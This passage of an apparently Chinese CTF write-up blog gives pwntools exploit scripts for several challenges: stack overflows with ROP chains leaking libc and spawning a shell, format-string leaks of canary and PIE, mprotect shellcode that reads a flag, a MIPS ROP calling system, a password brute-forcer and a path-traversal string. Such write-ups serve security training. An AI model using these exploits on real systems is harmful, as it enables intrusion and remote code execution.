class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment">#io=process(&quot;./chal&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;47.93.96.189&quot;</span>, <span class="number">36879</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : io.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : io.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : io.recvuntil(a,b)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : io.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : io.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">script=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">	gdb.attach(io, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&quot;break *0x40127A&quot;)</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#target=0x404000-0x20</span></span><br><span class="line">target=<span class="number">0x4005b0</span>+<span class="number">8</span>-<span class="number">0x20</span></span><br><span class="line">rbp=<span class="number">0x040117d</span></span><br><span class="line">rsi_0=<span class="number">0x00000000004010e4</span></span><br><span class="line">add_rsi=<span class="number">0x04010eb</span></span><br><span class="line">puts=<span class="number">0x404018</span></span><br><span class="line">rdi_rsi=<span class="number">0x0401180</span></span><br><span class="line">plt=<span class="number">0x0401070</span></span><br><span class="line">main=<span class="number">0x40127B</span></span><br><span class="line">ret=<span class="number">0x00000000004012a9</span></span><br><span class="line"></span><br><span class="line">num=<span class="number">0xffffffff</span>-<span class="number">0x12</span>-<span class="number">0xc8</span></span><br><span class="line">p=<span class="string">&quot;A&quot;</span>*(<span class="number">528</span>)+p64(puts)+p32(num)+p32(num)+p64(rbp)+p64(target)+p64(rsi_0)+p64(add_rsi)</span><br><span class="line">p+=p64(rdi_rsi)+p64(plt)+p64(main)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">160</span>):</span><br><span class="line">	sl(p)</span><br><span class="line"></span><br><span class="line">libc=u64(ru(<span class="string">&quot;\x7f&quot;</span>,<span class="literal">False</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&quot;\0&quot;</span>))-<span class="number">0x21b780</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rsi=libc+<span class="number">0x2be51</span></span><br><span class="line">rsi_rdx=libc+<span class="number">0x118f2f</span></span><br><span class="line">rdi=libc+<span class="number">0x2a3e5</span></span><br><span class="line"></span><br><span class="line">binsh=libc+<span class="number">0x1d8678</span></span><br><span class="line">system=libc+<span class="number">0xeb080</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system)</span><br><span class="line"></span><br><span class="line">p=<span class="string">&quot;A&quot;</span>*(<span class="number">528</span>+<span class="number">8</span>)+p32(num)+p32(num)+p64(rbp)+p64(<span class="number">0x4040a0</span>)+p64(rdi)+p64(binsh)+p64(rsi)+p64(<span class="number">0</span>)+p64(rsi_rdx)+p64(system)</span><br><span class="line">sl(p)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>



<h3 id="web苦手"><a href="#web苦手" class="headerlink" title="web苦手"></a>web苦手</h3><p>两个密码生成的密钥只要最高位为00就可以绕过检测</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">salt = <span class="string">b&quot;XYCTF&quot;</span></span><br><span class="line">iterations = <span class="number">1</span></span><br><span class="line">dklen = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">charset = string.ascii_letters + string.digits  <span class="comment"># a-zA-Z0-9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>, <span class="number">67</span>):</span><br><span class="line">    <span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(charset, repeat=length):</span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span>.join(candidate).encode()</span><br><span class="line">        key = hashlib.pbkdf2_hmac(<span class="string">&quot;sha1&quot;</span>, password, salt, iterations, dklen)</span><br><span class="line">        <span class="keyword">if</span> key[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found password:&quot;</span>, password.decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#J</span></span><br><span class="line"><span class="comment">#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用这两个密码登陆之后目录穿越拿到真的flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../..//flag</span><br></pre></td></tr></table></figure>

<h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>栈迁移打mprotect，之后用openat, mmap, write 读flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment">#io=process(&quot;./chal&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;47.94.15.198&quot;</span>, <span class="number">34840</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : io.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : io.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : io.recvuntil(a,b)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : io.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : io.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">script=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    gdb.attach(io, gdbscript=script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p=<span class="string">&quot;%7$p-%15$p-%3$p&quot;</span></span><br><span class="line">sa(<span class="string">&quot;first&quot;</span>, p)</span><br><span class="line">ru(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">leak=ru(<span class="string">&quot;Y&quot;</span>).split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">canary=<span class="built_in">eval</span>(leak[<span class="number">1</span>])</span><br><span class="line">pie=<span class="built_in">eval</span>(leak[<span class="number">0</span>])-<span class="number">0x18d9</span></span><br><span class="line">libc=<span class="built_in">eval</span>(leak[<span class="number">2</span>])-<span class="number">0x114887</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(pie)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc)</span><br><span class="line"></span><br><span class="line">read=libc+<span class="number">0x1147d0</span></span><br><span class="line">ret=pie+<span class="number">0x0157B</span></span><br><span class="line">rdi=libc+<span class="number">0x2a3e5</span></span><br><span class="line">rax=libc+<span class="number">0x45eb0</span></span><br><span class="line">rsi=libc+<span class="number">0x02be51</span></span><br><span class="line">r12=libc+<span class="number">0x35731</span></span><br><span class="line">rdx_r12_r13=libc+<span class="number">0xa80c8</span></span><br><span class="line">mprotect=libc+<span class="number">0x11eaa0</span></span><br><span class="line">call=libc+<span class="number">0x29d8e</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop=<span class="string">&quot;X&quot;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)</span><br><span class="line">rop=rop.ljust(<span class="number">0x100</span>, <span class="string">&quot;X&quot;</span>)</span><br><span class="line"></span><br><span class="line">sc=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">movabs rax, 0x67616C66</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">mov rdi, -100</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">xor r10, r10</span></span><br><span class="line"><span class="string">mov rax, 0x101</span></span><br><span class="line"><span class="string">syscall #openat(AT_FDCWD, &quot;flag.txt&quot;, 0, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0x1337000</span></span><br><span class="line"><span class="string">mov rsi, 0x1000</span></span><br><span class="line"><span class="string">mov rdx, 1</span></span><br><span class="line"><span class="string">mov r10, 1</span></span><br><span class="line"><span class="string">mov r8, rax</span></span><br><span class="line"><span class="string">xor r9, r9</span></span><br><span class="line"><span class="string">mov rax, 0x9</span></span><br><span class="line"><span class="string">syscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x1337000</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop=<span class="string">&quot;&quot;</span></span><br><span class="line">rop+=p64(rdi)+p64(pie+<span class="number">0x4000</span>)</span><br><span class="line">rop+=p64(rsi)+p64(<span class="number">0x2000</span>)</span><br><span class="line">rop+=p64(rdx_r12_r13)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(rdx_r12_r13)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(mprotect)</span><br><span class="line"><span class="comment">#rop+=p64(rdi)+p64(0)</span></span><br><span class="line"><span class="comment">#rop+=p64(rsi)+p64(pie+0x4000+0x1000)</span></span><br><span class="line"><span class="comment">#rop+=p64(r12)+p64(0x100)</span></span><br><span class="line"><span class="comment">#rop+=p64(rdx_r12_r13)+p64(0)*2</span></span><br><span class="line"><span class="comment">#rop+=p64(read)</span></span><br><span class="line">rop+=p64(rax)+p64(pie+<span class="number">0x40d0</span>)</span><br><span class="line">rop+=p64(call)</span><br><span class="line">rop+=sc</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(rop)</span><br><span class="line">sa(<span class="string">&quot;first&quot;</span>, rop)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p=<span class="string">&quot;A&quot;</span>*<span class="number">56</span>+p64(canary)+p64(pie+<span class="number">0x04060</span>-<span class="number">8</span>)+p64(pie+<span class="number">0x1676</span>)</span><br><span class="line"><span class="comment">#p=&quot;A&quot;*56+p64(canary)+&quot;A&quot;*8+p64(pie+0x1220)</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sa(<span class="string">&quot;?&quot;</span>, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">movabs rax, 0x67616C66</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">mov rdi, -100</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">xor r10, r10</span></span><br><span class="line"><span class="string">mov rax, 0x101</span></span><br><span class="line"><span class="string">syscall #openat(AT_FDCWD, &quot;flag&quot;, 0, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0x1337000</span></span><br><span class="line"><span class="string">mov rsi, 0x1000</span></span><br><span class="line"><span class="string">mov rdx, 1</span></span><br><span class="line"><span class="string">mov r10, 1</span></span><br><span class="line"><span class="string">mov r8, rax</span></span><br><span class="line"><span class="string">xor r9, r9</span></span><br><span class="line"><span class="string">mov rax, 0x9</span></span><br><span class="line"><span class="string">syscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x1337000</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>



<h3 id="明日方舟寻访模拟器"><a href="#明日方舟寻访模拟器" class="headerlink" title="明日方舟寻访模拟器"></a>明日方舟寻访模拟器</h3><p>让count变成sh之后传给system，因为输出被关所以把输出道到stderr</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;INFO&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment">#io=process(&quot;./chal&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;47.94.172.18&quot;</span>, <span class="number">28754</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : io.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : io.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : io.recvuntil(a,b)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : io.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : io.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">script=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        gdb.attach(io, gdbscript=script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=<span class="string">&quot;A&quot;</span>*<span class="number">72</span>+p64(<span class="number">0x4018e5</span>)+p64(<span class="number">0x405bcc</span>)+p64(<span class="number">0x04018FC</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh=<span class="number">0x6873</span></span><br><span class="line"><span class="keyword">while</span> sh&gt;<span class="number">10000</span>:</span><br><span class="line">        sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">        sl(<span class="string">&quot;10000&quot;</span>)</span><br><span class="line">        sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">        sh-=<span class="number">10000</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;6739&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">s(p)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;cat flag 1&gt;&amp;2&quot;</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>



<h3 id="EZ-3-0"><a href="#EZ-3-0" class="headerlink" title="EZ 3.0"></a>EZ 3.0</h3><p>mips rop</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00400a20</span> : lw $a0, <span class="number">8</span>($sp) ; lw $t9, <span class="number">4</span>($sp) ; jalr $t9 ; nop</span><br></pre></td></tr></table></figure>

<p>这gadget可以把a0和t9控制，再跳到t9，a0为函数参数。把a0变成&#x2F;bin&#x2F;cat flag.txt，t9变成system</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;INFO&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment">#io=process([&quot;qemu-mipsel&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./ez&quot;])</span></span><br><span class="line">io=remote(<span class="string">&quot;47.94.15.198&quot;</span>, <span class="number">26720</span>)</span><br><span class="line"><span class="comment">#a=process(&quot;./ez&quot;)</span></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : io.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : io.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : io.recvuntil(a,b)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : io.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : io.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">script=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">	gdb.attach(a, gdbscript=script,arch=<span class="string">&quot;mips&quot;</span>)</span><br><span class="line"></span><br><span class="line">cat=<span class="number">0x0411010</span></span><br><span class="line">gadget=<span class="number">0x00400a20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=&quot;A&quot;*(32+4*1)+p32(0x004009c8)</span></span><br><span class="line">p=<span class="string">&quot;A&quot;</span>*(<span class="number">32</span>+<span class="number">4</span>)+p32(gadget)+p32(cat)+p32(<span class="number">0x400b70</span>)+p32(cat)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;&gt;&quot;</span>, p)</span><br><span class="line"></span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;+++++++++++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;.[-]&gt;++++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;.[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++[&lt;++++++++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]</span><br></pre></td></tr></table></figure>

